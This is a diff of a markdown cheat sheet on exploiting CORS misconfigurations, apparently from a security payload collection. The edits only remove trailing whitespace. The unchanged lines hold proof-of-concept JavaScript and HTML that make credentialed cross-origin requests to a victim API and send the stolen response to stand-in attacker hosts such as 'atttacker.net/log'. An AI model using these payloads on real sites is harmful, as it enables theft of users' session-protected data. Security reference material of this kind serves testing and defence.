@@ -1,6 +1,6 @@
 # CORS Misconfiguration
 
-> A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker’s site using the victim’s credentials. 
+> A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker’s site using the victim’s credentials.
 
 ## Summary
 
@@ -21,7 +21,7 @@
 
 ## Exploitation
 
-Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target **https://victim.example.com/endpoint**.
+Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target **<https://victim.example.com/endpoint>**.
 
 ### Vulnerable Example: Origin Reflection
 
@@ -31,11 +31,11 @@ Usually you want to target an API endpoint. Use the following payload to exploit
 GET /endpoint HTTP/1.1
 Host: victim.example.com
 Origin: https://evil.com
-Cookie: sessionid=... 
+Cookie: sessionid=...
 
 HTTP/1.1 200 OK
 Access-Control-Allow-Origin: https://evil.com
-Access-Control-Allow-Credentials: true 
+Access-Control-Allow-Credentials: true
 
 {"[private API key]"}
 ```
@@ -43,18 +43,18 @@ Access-Control-Allow-Credentials: true
 #### Proof of concept
 
 ```js
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://victim.example.com/endpoint',true); 
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://victim.example.com/endpoint',true);
 req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    location='//atttacker.net/log?key='+this.responseText; 
+    location='//atttacker.net/log?key='+this.responseText;
 };
 ```
 
-or 
+or
 
 ```html
 <html>
@@ -93,11 +93,11 @@ response:
 GET /endpoint HTTP/1.1
 Host: victim.example.com
 Origin: null
-Cookie: sessionid=... 
+Cookie: sessionid=...
 
 HTTP/1.1 200 OK
 Access-Control-Allow-Origin: null
-Access-Control-Allow-Credentials: true 
+Access-Control-Allow-Credentials: true
 
 {"[private API key]"}
 ```
@@ -119,7 +119,7 @@ origin in the request:
   function reqListener() {
     location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
    };
-</script>"></iframe> 
+</script>"></iframe>
 ```
 
 ### Vulnerable Example: XSS on Trusted Origin
@@ -158,13 +158,13 @@ Access-Control-Allow-Origin: *
 #### Proof of concept
 
 ```js
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://api.internal.example.com/endpoint',true); 
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://api.internal.example.com/endpoint',true);
 req.send();
 
 function reqListener() {
-    location='//atttacker.net/log?key='+this.responseText; 
+    location='//atttacker.net/log?key='+this.responseText;
 };
 ```
 
